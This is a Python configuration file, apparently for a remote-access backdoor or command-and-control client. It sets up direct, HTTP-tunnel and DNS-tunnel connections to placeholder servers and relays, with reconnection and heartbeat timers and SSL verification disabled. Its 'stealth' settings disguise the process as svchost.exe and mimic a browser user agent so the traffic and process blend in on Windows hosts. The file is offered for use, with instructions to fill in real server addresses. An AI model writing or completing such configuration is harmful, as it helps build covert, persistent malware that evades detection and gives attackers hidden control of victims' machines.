from typing import Set

# ==================== Connection Settings ====================
SERVER_ENDPOINTS = [
    # Replace with your actual server addresses
    {"host": "your-actual-server.com", "port": 1234, "method": "direct_ssl"},
    {"host": "your-backup-server.com", "port": 443, "method": "http_tunnel"},
    {"host": "your-dns-server.com", "port": 53, "method": "dns_tunnel"},
]

# ==================== Stealth Settings ====================
PROCESS_NAME = "svchost.exe"  # Windows
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ==================== Reconnection Settings ====================
MAX_RECONNECT_ATTEMPTS = 10
RECONNECT_DELAY_BASE = 30  # seconds
HEARTBEAT_INTERVAL = 60

# ==================== Security Settings ====================
ENCRYPT_COMMUNICATION = True
VERIFY_SSL = False  # Set to True in production

def get_public_servers():
    """List of public relay servers (configure these)"""
    return [
        "relay1.yourserver.com:1234",
        "relay2.yourserver.com:443",
        "proxy.yourserver.com:8080"
    ]